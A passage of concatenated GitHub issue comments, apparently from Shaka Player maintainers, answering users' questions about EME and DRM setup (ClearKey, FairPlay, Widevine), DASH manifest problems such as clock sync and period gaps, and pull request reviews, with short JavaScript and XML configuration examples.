media pipeline on OSX, but it's definitely outside the control of Shaka.)\nPlayback does not, however, continue to the end of the stream.  At some point, it stops.  Not sure why.  I haven't looked at the Network panel in the developer tools, nor have I tried this with verbose logging.\n. @ismena, please retest with latest Shaka Player & latest Chrome stable (52).\n. @JimmyVV, if you have specific issues with latency, please file a new issue.  This issue was closed more than 1.5 years ago, and does not seem to relate directly to latency.  Thanks!. I believe I have a better fix.  Should be out soon.\n. This should be fixed in 6e62c6e.  I'm closing the PR, but please let us know if our fix is working for you.\n. Thanks for the correction!  (Original post edited.)\n. If there is no license request, then Shaka has not received an encrypted event from the media stack.  You may want to debug at shaka.media.DrmEngine.prototype.onEncrypted_.\nWithout an encrypted event containing initialization data, we can't ask the CDM to generate a license request.  If there is init data in a cenc:pssh element in the manifest, we will use that data instead and ignore encrypted events from the browser.\n. Oh, and I should also add that browsers send 'encrypted' events when they encounter PSSH boxes in the media.  If there is no PSSH box in the media, then init data will have to be provided via the manifest (cenc:pssh element) or your custom callback (initData field, an array of init data override objects).\n. Whoops, it looks like the spec has moved some things around.  We'll get those links updated in our docs.  In the mean time, here's the current link: https://w3c.github.io/encrypted-media/format-registry/initdata/#registry\nFor ClearKey content, you should use the keyids format, which is a JSON string.  All you need are the key IDs.  For example:\njson\n{\n  \"kids\": [\n    \"LwVHf8JLtPrv2GUXFW2v_A\",\n    \"0DdtU9od-Bh5L3xbv0Xf_A\"\n  ]\n}\nSo something like this should do the trick:\n``` js\nvar keyIds = [ / collect your key IDs here / ];\nvar initDataString = JSON.stringify({kids: keyIds});\nvar initData = new Uint8Array(initDataString.length);\nfor (var i = 0; i < initDataString.length; ++i) {\n  initData[i] = initDataString.charCodeAt(i);\n}\nvar initDataOverride = {\n  initDataType: 'keyids',\n  initData: initData\n};\n``\n. TheinitData` field in the config object is an array.  That may be the problem.\njs\ninitData: [{\n  initDataType: 'keyids',\n  initData: initData\n}]\n. What browser, browser version, and OS are you using?  It might help to track down why the init data can't be parsed.\n. Last I checked, only Chrome, Firefox, and Opera had ClearKey.  IE, Edge, and Safari did not, but it's possible Edge has introduced ClearKey support since I last looked.\nCan you use an uncompiled version of Shaka and provide the complete log from Chrome?\n. What version did you install from npm?  \"dist/deps.js\" is the path for v2.0.0-beta, but not for the v1.6.5 release.\n. Yes, v2.0.0-beta is what we are discussing, so if you install from npm, make sure that is the version you have installed.\n. The Firefox stack trace shows that the EME implementation rejected the init data.\nThe Chrome stack trace shows that the video element threw MEDIA_ERR_SRC_NOT_SUPPORTED (outside of Shaka).  Not sure what to make of this.\nI'm not actually familiar with Azure's AES encryption.  I've been working under the assumption that ClearKey was the right way to implement it on the client, and that the necessary key ID information was available in the manifest.\nIf you can provide me with URL for one of your manifests, I can try to help you determine the right way to proceed.  If you can't provide the manifest publicly, you can send me a private email.  My address is in the CONTRIBUTORS files.\n. This looks like HLS-style encryption, based on \"AES128-CBC\", a \"key URI\", and an explicit IV:\nxml\n<sea:SegmentEncryption schemeIdUri=\"urn:mpeg:dash:sea:aes128-cbc:2013\"/>\n<sea:KeySystem keySystemUri=\"urn:mpeg:dash:sea:keysys:http:2013\"/>\n<sea:CryptoPeriod\n  keyUriTemplate=\"https://wamsamsclus001kd-hs.cloudapp.net/?KID=ef07d917-5c6e-45d2-8ce2-28abac2a4e35\"\n  IV=\"0x29EB6D7A6EC2B30AB04DC63C2E4F010E\"/>\nI don't believe you're going to be able to do this with ClearKey, which as far I know currently requires AES128-CTR.  Please seek further guidance from Microsoft.\n. We can't go back to the previous workaround, since the EME spec is getting more strict about specifying codecs and Chrome has already moved to deprecate configurations without codecs.\nIn DrmEngine, we are already working around a bug in Edge's EME implementation where multiple entries are not supported.  It seems that Edge's EME does not support the codecs string for multiplexed streams, either.  We could expand our hack further to completely exclude codecs for Edge, but that could blow up in our faces if Edge 14 or 15 updates to the newer EME working draft and starts requiring codecs as Chrome 51 is doing.\nIn general, we have never directly supported multiplexed streams.  We've never forbidden them, but we have never had a goal of supporting them, either.\nI'm not sure what we will be able to do about this, but I highly recommend that you file a bug report with Microsoft about the lack of support for multiple codecs in the query.  If you do, please link to it here.\nI'm removing the v2.0.0 label since we do not explicitly support multiplexed streams, but I will continue to investigate to see if we can fix it without too much risk.\n. Ah, I see.  Then perhaps Chrome doesn't support multiplexed representations in EME.  If you file a bug against Chrome, please link to it here.\nWe will definitely not be able to work around this for Chrome, since Chrome will soon reject queries without a codec string.\n. It's entirely possible that Widevine doesn't support multiplexed representations on all platforms.  It could be that the query is truthfully being rejected by the browser.  Or it could be that this type of query isn't supported.\nWhat Shaka is doing is faithfully passing the information from the manifest to EME, and the EME implementation is rejecting it.  I think the best thing for you to do is to file a bug at http://crbug.com/ and find out if this is intended behavior on the part of Chrome or not.\nIf the answer is that the query should be split, we'll split it.\nIf the answer is that multiplexed representations are intentionally not supported by Chrome or Widevine, then there's not much we can do in Shaka.  Any changes we make now to split the codecs up for you may break on other platforms or may break in future versions of Chrome if multiplexed streams are not supported.\n. @ddorwin, is this reasonable from an EME perspecitve?  Just put audio mime types & codecs in audioCapabilities and video mime types & codecs in videoCapabilities even though the stream we deliver to the CDM will be multiplexed and contain both?\nWhat about from a Chrome CDM perspective?  Will multiplexed content work with the Chrome CDM interface when the CDM is being asked to decode as well as decrypt?\n. Okay, so we could support this by parsing SubRepresentation and ContentComponent and correlating the two, then populating this info to a new array member in the manifest's Stream object.  Representation.mimeType would be combined with each SubRep's codecs and the associated ContentComponent.contentType.  For example, mimeType video/mp4 + contentType audio + codecs mp4a.40.2 => audio/mp4; codecs=mp4a.40.2.  DrmEngine then uses this new array of MIME types to build its query.\nI'd like something simpler, though.\nWe could split the codecs string we have and rebuild those MIME types in DrmEngine, but then DrmEngine has to know how to map specific codecs to content types, and that seems brittle.  We shouldn't assume we can hard-code knowledge of specific codecs, as new ones can be introduced later.\nI'm scheduling this for after v2.0.0 for now.\n. @maxbykov, after further consideration and after consulting DASH interoperability guidelines, I have decided that we will not support multiplexed content.\nDASH IOP v3.3 states:\n\nonly non-multiplexed Representations shall be used, i.e. each Representation only contains a single media component.\n\nMultiplexed content does not meet DASH guidelines for interoperability, and therefore we will not put any effort into supporting it in the player.\n. I'm closing the issue now, but if you feel strongly about this, we can, of course, discuss it further.  I would encourage you to use non-multiplexed content and to try to follow IOP guidelines as much as possible.\nThanks for using Shaka Player, and please let me know if there's anything else we can do for you.\n. logPrefix_() is only used in logs which are not in the compiled build.  I just checked a build of v1.6.5, and the logPrefix_ doesn't appear anywhere in it.\nhttps://cdnjs.cloudflare.com/ajax/libs/shaka-player/1.6.5/shaka-player.compiled.js\nHow are you building Shaka Player?\n. I'm afraid I'm not familiar with ClojureScript (in spite of the similarity to our Closure Compiler).  It sounds like you have an issue with your build system or compiler.  With MAX_LOG_LEVEL set to 0, you shouldn't have any logs or calls to logPrefix_().  Your pull request defines logPrefix_ for compiled builds, which is the opposite of what we intended for that method.\nSince it enables logPrefix_ for compiled builds to solve a problem we can't reproduce in our build system, I'm afraid I can't accept PR #362 as-is.\nSince you aren't using our build system, I'm not sure how we can provide direct support, but I will do what I can to answer any questions you might have.  Closure removes log calls through dead-code stripping when COMPILED is true and shaka.log.MAX_LOG_LEVEL is 0.  If your compiler doesn't do this, then you may not be able to build Shaka with it.  This project has been designed from the beginning for use with the Closure compiler.\nYou could always try compiling Shaka Player with our build system and the Closure Compiler, then import that compiled bundle into your project.  Our output is valid, optimized, minified JavaScript, with all public APIs exported to window.shaka.  You should have no problems feeding that into your compiler.  That may be the best solution if the ClojureScript compiler is not performing all the same optimization passes that Closure does.\n. No problem.  We're always happy to help if we can.\n. We run our tests with karma, and we already have a Jenkins-based build bot that builds and tests each PR on real browsers and real hardware.  We test PRs on Chrome Linux and we run all tests nightly on Linux, Mac, and Windows using Chrome, Firefox, Opera, IE 11, Edge, and Safari.\nOur build bot is already integrated with github and reports status back to the pull request.  For an example of what this looks like, see: https://github.com/google/shaka-player/pull/315#issuecomment-203080412\nOur integration tests require HTML5 video, MSE, and EME.  Running tests on PhantomJS won't work because they don't have HTML5 video (issue).  We stopped using BrowserStack because of their lack of PlayReady support, among other reasons.  We also considered SauceLabs, but they don't support PlayReady and don't seem to be considering it at the moment (ticket).\nSo far, the only solid solution we have found is to run our tests on real hardware, so I don't think Travis is viable at the moment.  Since we already have a bot that tests PRs, I'm going to close this as \"working as intended\".  Thanks!\n. Error 6001 is 'REQUESTED_KEY_SYSTEMS_UNAVAILABLE', defined in lib/util/error.js and documented at http://shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html.  The docs say:\n\nNone of the requested key systems are available. A license server URI is required; so this may also happen if the key systems do not have a license server URI.\n\nI also recommend reading the DRM Configuration tutorial: http://shaka-player-demo.appspot.com/docs/api/tutorial-drm-config.html\nDoes that answer your question?\n. Thanks for the report.  We'll take a look.\n. Can you try reverting a commit for me locally to see what happens?  I'm suspicious of 60d2944.\n. Okay, then I'll go ahead and revert that commit and reopen the bug it was supposed to fix.  Thanks for testing!\n. I suspect the issue is caused by https://github.com/google/shaka-player/blob/acfb7c6d41f524eb7bd57951729039f95b460262/lib/dash/dash_parser.js#L723\nWe'll see what we can do.  Thanks!\n. You should only see instances of shaka.util.Error at the application level.  The assertion means that there is a condition we are not handling properly.  Otherwise, the assertion itself is harmless.  There is, however, an error condition of some kind.  Since we are not reporting it correctly, it's hard to say what it is.  :-)\nIf you can provide a manifest URL, we can try it out and trace the real problem for you.\n. Good point.  We should also update the name REQUESTED_KEY_SYSTEMS_UNAVAILABLE to REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE and be specific in the documentation that user options may cause the error as well as missing key systems.\n. Yes, thank you.  We'll be careful with the wording.\n. It is hard to say whether it's Shaka-related or not.  It could be that we're misinterpreting a manifest, or it could be broken content.  If you can provide an example of content that triggers the issue for you, we could take a look and help determine the cause.\nCan you send us a manifest URL?\n. @dobrusev Is this still an issue for you or can we close it?\n. This stream looks broken.  Shaka prints tons of warnings when loading this content.\nMost of the Representations are missing content.  All of your video and audio Representations have the same timescale (90000), so we can compare times directly across all AdaptationSets:\nThe 1080p video Representation ends with <S t=\"25923600\" d=\"637200\"/>.  The final timestamp is 26560800.  This is about the same as the presentation duration (292 seconds).\nThe other video Representations end with <S t=\"12963600\" d=\"360000\"/>.  The final timestamp is 13323600.  They are missing about 2.5 minutes worth of segments.\nThe last audio Representation in the manifest ends with <S t=\"25925520\" d=\"639360\"/>.  The final timestamp is 26564880.  Again, this is about the same as the presentation duration.\nThe other audio Representations end with <S t=\"12965520\" d=\"359040\"/>.  The final timestamp is 13324560.  These are also missing about 2.5 minutes worth of segments.\nThe reason you don't see ended events with this manifest is because the video can't reach the end.  The chosen audio and video Representations are different lengths.\nPlease report this to your encoder vendor.  All Representations in a Period should cover the entire Period.  Small inconsistencies are generally well-tolerated, but 2.5 minutes is gigantic.\n. Happy to help!\n. v1.6.5 on cdnjs appears to actually be v2.0.0-beta.  I'm not sure how this happened.\nv1.6.4 on cdnjs is correct.  All versions on npm seem to be correct.\nI will contact cdnjs for support on this.  Thanks!\n. This appears to be fixed now:  cdnjs/cdnjs#8234\n. @aletorrado Is this still an issue for you, or can we close it?\n. @aletorrado, since we haven't heard from you in a while, I'm closing this issue now.  If you need further support, just let us know and we'll be happy to help.\n. Your manifest does not contain a UTCTiming element, which is how manifests specify time sync between client and server.\nIn v2.0.0-beta2 we introduced a configuration option for situations where you cannot add UTCTiming to your manifest.  You can instead configure a URI for the player to use as if it came from UTCTiming.\nDocs: http://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#DashManifestConfiguration\n\nA default clock sync URI to be used with live streams which do not contain any clock sync information. The \"Date\" header from this URI will be used to determine the current time.\n\nExample:\njs\nplayer.configure({\n  manifest: {\n    dash: {\n      clockSyncUri: 'http://foo.bar/time'\n    }\n  }\n});\nThe demo app at http://shaka-player-demo.appspot.com/demo/ has a clock sync URI configured, so your manifest should work correctly on that demo regardless of your local clock.  (Please let us know if it does not.)\nDoes this answer your question?\n. Hi @asdftu, please try again with the latest from master.\n. I believe the Chrome DTS/PTS bug has now been fixed, so I'm closing this bug.  If you still have issues with the latest stable release of Chrome, please file a new issue.  Thanks!. Sorry for taking so long to reply.  This slipped through the cracks.\nI don't know why you would get that behavior.  We really don't have any expertise in webGL.  I would guess that some platforms and DRM systems may prevent you from capturing content by design, but that is just my best guess.\nSince we don't have details on the internals of this, and since WebGL and capturing frames are both very much out of the scope of what Shaka is trying to provide, I'm going to go ahead and close this issue.  I'm very sorry we weren't able to help you with this, but I hope that Shaka has at least been a useful tool for mosaics of non-DRM content.\n. Thanks, we'll take a look.  Odds are good that there is a gap at the start of the second period, which is something we do not currently support.\n. \"Gap\" means a discontinuity in the media timeline.  For example, if period 1 is from time 0 to time 9.8, but period 2 starts at time 10, then there is a gap of 0.2 for which there is no media.\nWe haven't analyzed your content yet to see if there is a gap, but that is my guess based on the behavior you are describing.\n. Please re-encode the content in question or report the bug to the vendor of the encoding/packaging software.\n. @sarge, it couldn't hurt!  Thanks!. Here's an update on our progress.\nThe polyfill part is not that difficult.  I have written a polyfill that builds a compliant MediaKeys API on top of Safari 10's WebKitMediaKeys.\nParsing the FairPlay tag in HLS to feed EME is trivial.\nThe challenge is that the key system com.apple.fps.1_0 seems to be usable only with video.src=foo.m3u8.  When used with MediaSource, createSession() causes the page to crash and reload.  And Shaka Player currently only works with MediaSource.\nJudging from a WebKit commit log, they introduced com.apple.fps.2_0 for MediaSource:\n\n(WebCore::keySystemIsSupported): Use \"com.apple.fps.2_0\" to distinguish from the not-media-source scheme.\n\nI have not been able to find any working examples of that key system in use.\nCreating a session with fps.2_0 results in a message that contains only the text \"certificate\".  Looking at WebKit sources, this is unconditional and we are expected to call update() with the certificate after that.\nDealing with this certificate request is enough to do, and we can even hide it in the MediaKeys polyfill.  However, the message we get after that is not a license request, either.  It's completely empty.\nWebKit sources also show support for com.apple.fps.3_0, but that also has no documentation and does not get us any further than fps.2_0 did.. I mean that the second webkitkeymessage event has message.length of zero.. I can't push anything until it's been through code review by the team, but I'll try to clean up what I've done so far and make it available in some form.. At a glance, the EME API has not changed much in Safari 11 Tech Preview.  I have not yet investigated deeper to see if FairPlay is any easier to use.. That looks a lot like what I was able to achieve, except that when I get the 11-byte certificate message and pass my certificate back to update(), the next message I get is empty.  I'm not sure if my cert is bad or if the original init data was to blame.  (Presumably the real license request based on init data was deferred during cert request, so it could be the init data's fault.). In that case, there is probably nothing that we can do to complete this work.  If Apple actively does not want us to do it, there may be no point in continuing.  I will still endeavor to clean up and publish my work-in-progress FairPlay polyfill, in case it is useful to anyone in the future.\n@sarge, is your support conversation with Apple public?  If so, could you provide a link to help document the current situation?. Hi all,\nI just published a new branch called fairplay including just one unique commit with what I was able to accomplish for FairPlay in Safari with MediaSource.\nI hope this is a useful starting point for someone to help us figure out the missing pieces, assuming it is possible at all.  For now, I am moving this issue back to the backlog.  Please let us know if you have any insights or if you can contribute.\nThanks,\nJoey. Hi all,\nWe haven't had time to look at this in the last couple months.  It will be a priority for v2.3, which we will be starting soon.  I apologize for the delay.. Sorry for the lack of updates.  We haven't had time to work on this lately, but we hope to get back to it soon.  This may be obviated by #997, at which point we don't need to do quite so much work to make FairPlay + MediaSource work.. Based on feedback from our survey, this is at the top of our list for v2.4.  I'll try to get the branch updated against master soon.. I pushed updates to the fairplay branch.  I hope this helps.. Sounds good.  We are no rush at the moment.  It's something we plan to give more attention to for v2.4 in January.. @sridhard, no updates yet.\nYou are mistaken about #1447, though.  It does not say fps1.0 is supported.  Rather, it says we plan to support it, and refers back to this issue to track progress.\nI know this issue is important to many people, and I regret the delay in implementation.  I promise that we will give updates as soon as there are updates to give.  Thank you for your continued patience.. Thanks for the report.  We'll look into it.\n. We are not interested in a bigint library at this time.  You are welcome to make modifications, of course, but that is not a change we would accept in a pull request.\nWe only support integers as large as can be accurately represented in JavaScript.  (After all, this is a JavaScript library.)\nI would much prefer to see encoders create content that is compatible with the web platform.  There's no reason a manifest should need such a large timescale.  I recommend you raise this issue with your encoder vendor.  It should be easy to fix, I would imagine.\nI would be happy to help you discuss it with your encoder vendor.  My email address can be found in CONTRIBUTORS.\nThanks!\n. Thanks, we'll take a look.  Odds are good that there is a gap at the start of the second period, which is something we do not currently support.\n. Sorry we lost track of this one.  It appears that you have a gap in your content.  According to Chrome's buffered time ranges, Period 0 ends at 89.061333, but Period 1 begins at 89.24.  The references from the manifest seem to indicate that the final segments of Period 0 should go all the way to 89.24, but they do not.\nGaps in content is something we do not support at this time.  Any gap larger than what the browser will jump automatically will currently cause a hang such as this one.  As far as we know, a gap of 150ms or less should be skipped by all major browsers, so that's our effective tolerance.\n. 1. Yes, for gapless playback, the next Period would start at the earliest end time of all AdaptationSets.  However, if there are large (> 150ms) differences in the length of AdaptationSets, you may have an issue with your encoder.  It may make more sense to fix the encoder than to hide the problem by changing the start time of the next Period.\n2. If there is overlap between Periods, the browser should skip it because MSE's appendWindowEnd should cut off everything past the end of the Period.\n3. We do not currently support gaps in content and we do not currently have it on our roadmap.\n. @l-law, is there anything else we can do for you on this topic?\n. Closing due to inactivity.\n. I think this belongs on https://github.com/google/shaka-packager .  This is the player.  Sorry for any confusion!\n. No problem!\n. I notice that you don't have a UTCTiming element, which is important for clock synchronization.  Odds are good that your client's clock is off.\nWhat version of Shaka Player are you using?  (shaka.Player.version)  Are you using your own app or our demo app to test?\nIn v2.0.0-beta2, we introduced two changes related to clock sync:\n1. A warning that says A UTCTiming element should always be given in live manifests!  (1fb7892)\n2. A configure() setting (manifest.dash.clockSyncUri) for a default clock sync URI.  (0a3d6bd)\n. > Can somebody please elaborate on what it means to add a UTCTiming element?\nA UTCTiming element is an XML element in your manifest that specifies how the client should synchronize its clock with your server.  Here's an example:\nxml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<MPD type=\"dynamic\" availabilityStartTime=\"1970-01-01T00:00:00Z\">\n  <UTCTiming schemeIdUri=\"urn:mpeg:dash:utc:direct:2014\" value=\"1970-01-01T00:00:30Z\" />\n  <Period>\n    <!-- ... -->\n  </Period>\n</MPD>\nIf your manifest is being generated on-the-fly, you can directly include the current time in the UTCTiming element with the scheme direct:2014:\nxml\n<UTCTiming schemeIdUri=\"urn:mpeg:dash:utc:direct:2014\"\n           value=\"1970-01-01T00:00:00Z\" />\nYou can have the client get the time from the HTTP Date header of a particular resource using the scheme http-head:2014:\nxml\n<UTCTiming schemeIdUri=\"urn:mpeg:dash:utc:http-head:2014\"\n           value=\"http://foo.bar/check_me_for_the_date_header\" />\nYou can also have a dynamically generated page on the server which itself contains the current time in XML date format (such as 1970-01-01T00:00:00Z):\nxml\n<UTCTiming schemeIdUri=\"urn:mpeg:dash:utc:http-xsdate:2014\"\n           value=\"http://foo.bar/my_body_is_the_current_date_and_time\" />\n\nIs setting the clockSyncUri as simple as player.configure({ clockSyncUri: [uri] }); ?\n\nYes, except it's a string and not an array of strings.  The URI you specify will be treated as if it was attached to the http-head:2014 scheme.  The HTTP Date header from that URI will be used to synchronize the client's clock.\n\nShould that URI point to the same server the player is hosted on?\n\nIt can work either way, but if the clock sync URI is on a different origin than the player, it will be a cross-origin request.  You can read more about CORS on MDN.\n\nWhy are these two things needed?\n\nYou don't need both.  If the UTCTiming element is in the manifest, the client can synchronize its clock by that. If not, the configured URI will be used as a fallback.  This is useful if you are not in control of the contents of the manifest for some reason.\nClock sync is critical for live playback, as the client must know what segments are available when.  An individual client's clock can be potentially very far off, but even small inaccuracies can have a big impact on playback.\nDoes that help?\n. It is very useful for our demo app to screen which assets are playable based on key system.  However, I'm not sure this is a common scenario for most app developers.\nA real application's content catalog is generally under their complete control, and is not likely to be segmented into pieces by key system.  Our demo content is mostly third-party, and the content we encoded ourselves is not currently multi-DRM.  So I don't think our demo app is representative of the needs of a typical video-streaming service.\nI believe most real applications will be serving all content with the same key systems.  For example, a catalog of DASH content may be all Widevine-encrypted, or all Playready-encrypted, or all multi-DRM using a specific set of DRM providers across all content.\n. What's a gem?\n. Sorry, rails is not on our roadmap.\n. Okay, I stand corrected.  We will consider it a non-priority enhancement, then.\n. I think we need two more changes related to this:\n1. change the default retry parameters so that more than one attempt is made by default\n2. since network errors may not be fatal, we should add a small 'dismiss' button to the error div in the demo app to allow a user of the demo to clear the error message\n. The DASH spec allows for many things that are not a good fit for MSE.  MSE does not allow changing codecs like this, so we do not support changing codecs across Representations.  There is an expectation in Shaka that Representations in an AdaptationSet have the same (or decoder-compatible) codec.\n. In what browser do you see more than one audio track for the dual-codec MPD?  My Chromebook only shows one (AAC), since EAC-3 is not supported by the browser.  If I query MSE in the JS console:\njs\nMediaSource.isTypeSupported('audio/mp4; codecs=\"mp4a.40.2\"')\ntrue\nMediaSource.isTypeSupported('audio/mp4; codecs=\"ec-3\"')\nfalse\n. If the two AdaptationSets are both playable, but incompatible with one another at a codec level, Shaka should filter out one once the other has been selected.  I'll look into it.\n. @barbibulle This should be fixed now.  We will not permit switching between incompatible codecs once one has been chosen, so you should only see one audio track now.\n. Is the content encrypted or clear?\n. If it works in Chrome stable (51) but not in Chrome 49, then I have to assume it's a bug in Chrome that was fixed already.\nIf the content is encrypted, MediaSource is not the only component that must support the MIME type.  MediaKeys must also support it.  The error you mentioned occurs when EME negotiation fails.  So the EME query for that type/codec must be failing.\nHere's a simplified version of Shaka's EME query for that type.  You can run this in the JS console to see what happens on your version of Chrome:\njs\nconfig = {videoCapabilities: [{ contentType: 'video/mp4; codecs=\"avc1.640814\"' }]};\nnavigator.requestMediaKeySystemAccess('com.widevine.alpha', [config]).then(\n    function() { console.log('okay'); },\n    function(e) { console.log(fail, e); }\n);\nUnfortunately, though, we will be unable to give direct support for outdated versions of Chrome, since Chrome is meant to be auto-updated.\nIf you have a fork or an embedded version of Chromium, you may be able to patch the bug yourself.  Since it appears that the bug has been fixed in Chrome stable, though, you may be able to identify the change that fixed it and back port that to your version.\n. Oh, I see.  I was not aware of that.  If you can track down the specific issue in crbug.com, it might be worth raising with Chrome team that the bug persists on OSX 10.7.\n. This looks similar to a DRM filtering bug we fixed incidentally in a644900.  Can you try again with the latest from master and let us know if that fixed your issue as well?\n. Ah, I see.  Because the polyfill actually supports and can query multiple capabilities, it returns the filtered list of types.  So only sending one to the polyfill causes the manifest to inappropriately filtered.\nI expect the Edge bug to be fixed in the near future, and we should be able to restrict the workaround to just Edge until then.  Thanks for the report!\n. I tested the fix on IE11 and Edge.  @Ross-cz, would you please retest with the latest from master and confirm the fix for us?\n. This looks similar to a DRM filtering bug we fixed incidentally in a644900.  Can you try again with the latest from master and let us know if that fixed your issue as well?\n. @karlovich Is this issue still affecting you?  We believe it should be fixed a while ago.  Please let us know.\n. Thanks!\n. Thanks for the report.  I'd be happy to have your PR to fix this in v1.x.  It's worth noting that in v2.x (master branch), cache-busting is no longer done at all.\nCan you give us some details on which browsers support blob URIs directly in XHR?  This is something I was not aware of, and a quick search of MDN did not turn up any information on this.\n. @esteban-dosztal, the code change looks fine to me.  Can you please add yourself to CONTRIBUTORS and AUTHORS as well?\n. Sorry, github does not notify us when you make revisions to your PR.  You have to say something in the comments for us to know to check it again.  :-)\nI'm just back from vacation, hence the additional 7 days of latency.  I'll merge it today.\n. Merged manually with cosmetic changes.\n. We are having issues with our build bot and a linter error snuck in.  We'll have it fixed shortly.  As for support, that's a separate issue.  See #402.\n. Thanks!  The linter error should be fixed now.  Please let us know if you have any other issues.\n. @chendiming This looks like a pull request with things that have already landed in v1.6.x.  What are you trying to accomplish with this PR?\n. @chendiming I'm going to close this PR.  It does not appear to make any sense, so I am assuming you created it by mistake.\n. This is not something we have tested yet, but I will look into it.\n. Thanks for testing for us, Rob!  Since this appears to be working in the latest Firefox with both versions of Shaka, I will consider the matter resolved by Mozilla.\n. @kidmiracleman: As @cpeterso pointed out, the issue with persistentState seems to be Firefox bug 1278198.  Since that is a bug in Firefox, not in Shaka, I've tagged it \"bug\" and \"external\".\nI will reopen this issue until the Firefox bug has been confirmed fixed.\n. We recently changed the API and neglected to update the tutorials.  See #388 for the change.  We'll have the tutorial text fixed shortly.\n. The fix has been pushed to master.  If you build the tutorials from source (build/docs.py), you will see the corrected text.\nPlease note that the tutorial text on appspot corresponds to our most recent release, which does not include the changes to support().  Our next release, v2.0.0-beta3, will contain these changes.\nPlease let us know if you have any other questions.\n. Reported via the mailing list: https://groups.google.com/forum/#!msg/shaka-player-users/5nT5ooVRCtw/eCuwkhibAgAJ\nThe fix should include a demo asset which uses a simple clearkey license server to verify the functionality.\n. This was broken in 0530362b on June 3.  It does not affect any release versions, including the betas of v2.  We'll get it fixed before we release v2.0.0-beta3.\n. Based on what you've provided, it appears that you are getting a 404 (not found) error on your license server URL http://192.168.52.22:8080/proxy/header_auth .  The 404 error page from your web server does not contain cross origin headers, which sounds reasonable.  But the request is cross origin, so the CORS error is making it less obvious that the real problem is your 404.\nShaka Player can still play 10 seconds worth because you packaged your content with 10 seconds of clear lead.  So this plays even without a license.\nI recommend you check your license server IP, endpoint URL, and web server config.  This does not appear to be a Shaka issue.\n. If it's stuttering in Chrome and not Firefox, then one browser is executing the code faster or with less resource contention.  Firefox being faster does not equal a bug in Shaka, in my opinion.\nThe merging code is semantically correct as far as I can tell, but we could/should make the library more efficient if we can.  This is an enhancement, in my opinion.\nThe issue is currently tagged with \"enhancement\", which I believe is the best label for a potential performance improvement.\nWe have not investigated yet to determine what the cause is, but we'll try to get this fix into v2.0's final release.  Since the code in question is completely new in v2 beta, it shouldn't affect v1.6.x, which is still the most stable release for now.\nSorry for the confusion over labels, and we'll keep you posted as we make progress.\n. @janouskovec, we are not actively enhancing v1.6, but we will investigate and see how much trouble it would be.  If it's not too complex, we will consider reimplementing in v1.  Follow along at #449.\n. @torerikal, if you or @janouskovec would be interested in cleaning this patch up and submitting a PR to v1.6.x, I would be very happy to review it.  I think overriding FailoverUri with a version that calculates this.urls at fetch() time looks pretty reasonable for v1.\nLet's move discussion to #449, though, so this original issue can rest in peace.  :-)\n. Yes, we broke this in a recent change.  When we started checking for license server URLs after choosing key systems, clearkey in the default set would mean the possibility of clearkey being chosen over actual DRM schemes on Chrome or Firefox, even without a clearkey config (keys or license server).\n. I think it might be worth discussing on the EME spec github.  Shaka Player can't really do anything to affect this.  The platform APIs and their restrictions are what they are (or in this case, will be).\nOur demo app, demo content, and Google-owned license servers are all available over https.  Our library and demos work equally well over both http and https, so we've done what we can to be ready.\nIf https becomes a requirement for EME in future, EME-based applications would have to be served over https.  You can either start migrating now or push back on the spec.\n. https://github.com/w3c/encrypted-media/ is a good place for further discussion.\n. Chrome has announced a deprecation timeline for EME in insecure contexts.  Support will be dropped at the end of March 2017.  In case you missed it on the mailing list, here's the post I made about it: https://groups.google.com/forum/#!topic/shaka-player-users/L0dYA3TcAkA. Sounds like a duplicate of #405, assuming your content uses SegmentTimeline or SegmentList.  You can follow along there if so.  If not, let us know and we can reopen and investigate.\nI can't guess why the issue is noticeable for Chrome but not Firefox, but it shouldn't matter to the fix.\n. Unencrypted content is allowed by design.  Imagine you have a piece of content with encrypted video streams but unencrypted audio.  No encrypted AdaptationSets for audio are available.  There's no reason this should be disallowed.  Note that this filtering based on key system is independent of multi-period considerations.\nWith multi-period, things get more complicated.  In particular, because we must change init segments when we change periods.\nAn encrypted stream can have unencrypted blocks.  You can package the first several seconds in the clear to allow time for license acquisition, for example.  The init segment still indicates that the content is encrypted, and as I understand it, the browser's media stack can tell that individual segments are or are not encrypted and decrypt them as needed.\nSo in theory, there should be no issue with initializing the decoder for encrypted content, then appending unencrypted content.  If your first period was encrypted and the second period clear, one could easily imagine a browser that could still decode this.\nChrome, however, does not support changing from encrypted to unencrypted (or vice-versa).  When the init segment for the second period is appended, Chrome rejects it.  chrome://media-internals will show something like \"audio encryption changes not allowed\".  We reported this in http://crbug.com/597443 and were told that this is working-as-intended for Chrome.\nShaka has no way to detect if a given browser supports this scenario or not, so there's no simple way to reject the content on browsers that can't play it.  We could disallow this completely, but some other browsers do support it.\nIf this is something you need, my recommendation is that you report the issue to Chrome and detail why support for this is important to your application.  Feel free to reference the existing crbug and/or this github issue for history.\n. The original code looks correct to me.  If we are emulating MSE's timestamp offset, we should add the offset to the parsed timestamps.  Can you please give us a sample manifest that reproduces your issue?\n. Here's why this is difficult to understand.  MediaSourceEngine delegates to TextEngine for text streams because MediaSource doesn't handle them.  So TextEngine is supposed to work just like MediaSource/SourceBuffer.  TextEngine's timestampOffset is meant to work exactly like SourceBuffer's timestampOffset: it is added to the timestamps of the media contained in future calls to appendedBuffer().\nSo it's not at all clear to me why this should need to be different for text.\nIn the manifest you attached, your text streams have a presentationTimeOffset identical to the ones in your audio and video streams from the same Period.  Do the timestamps in the text segments align with the ones in the corresponding video segment?\nCan you send a manifest URL I can use to see this in action?\n. Ah, okay, I see now.  It's the buffered ranges that are wrong.\n. I'm totally on board with this change now.  If you would, please:\n1. Fix the commit author to satisfy the CLA bot\n2. Update the title of the commit/PR to make it clearer what's going on (something like \"do not apply timestampOffset to text reference times\")\n3. Update the TextEngine unit tests in test/text_engine_unit.js (there's a section called \"bufferStart/bufferEnd\", and it looks like some of these would fail with your PR as-is)\nYou can easily run the tests with ./build/test.py\nThanks!\n. We have repro now and a new test asset to cover this case, but we have another fix in mind.\n. @baconz Please try the latest from master and confirm whether this fixes it for you.\n. That's right.  If your UI had manual track selection widget (like YouTube's 360p / 480p / 720p / 1080p / auto), that would connect to selectTrack.  If your UI has a language selection widget, that should connect to configure.\nIf that's confusing or unhelpful, let us know while we're still in beta and we can reconsider.\n. Makes sense.  In a nutshell, we should allow selection by both role and language without disabling ABR.  Is configure() still the best interface for this?\nI'm tentatively scheduling this for v2+, but if we have a design sooner we can consider it for 